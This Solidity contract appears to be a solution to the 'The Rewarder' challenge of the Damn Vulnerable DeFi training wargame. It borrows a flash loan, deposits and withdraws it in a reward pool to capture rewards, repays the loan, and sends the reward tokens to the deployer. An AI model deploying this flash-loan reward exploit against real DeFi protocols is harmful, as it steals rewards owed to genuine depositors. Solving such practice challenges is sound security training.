// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
interface FlashLoanerPool2 {
  function flashLoan(uint256 amount) external;
}

interface tokenR {
   function deposit(uint256 amountToDeposit) external;
   function withdraw(uint256 amountToWithdraw) external;
}

contract AttackRewarder {

    IERC20 public immutable damnValuableToken;
    address public contractToLoan;
    address public contratoToAttack;
    IERC20 public rewardToken;
    address public contratoSolo;
    address public atacante;

    constructor (address tokenAddress, address lenderPool, address _contratoToAttack, address _rewardToken) {
        damnValuableToken = IERC20(tokenAddress);
        rewardToken = IERC20(_rewardToken);
        contractToLoan = lenderPool;
        contratoToAttack = _contratoToAttack;
        atacante = msg.sender;
    }

    function ejecutarAtaque() public {
      uint256 cantidadAPrestar = 1000000 ether;

      FlashLoanerPool2(contractToLoan).flashLoan(cantidadAPrestar);
    }

    function receiveFlashLoan(uint256 amount) public {
      damnValuableToken.approve(contratoToAttack, amount);
      tokenR(contratoToAttack).deposit(amount);
      tokenR(contratoToAttack).withdraw(amount);
      damnValuableToken.transfer(contractToLoan, amount);
      uint256 rewards = rewardToken.balanceOf(address(this));
      rewardToken.transfer(atacante, rewards);
    }



}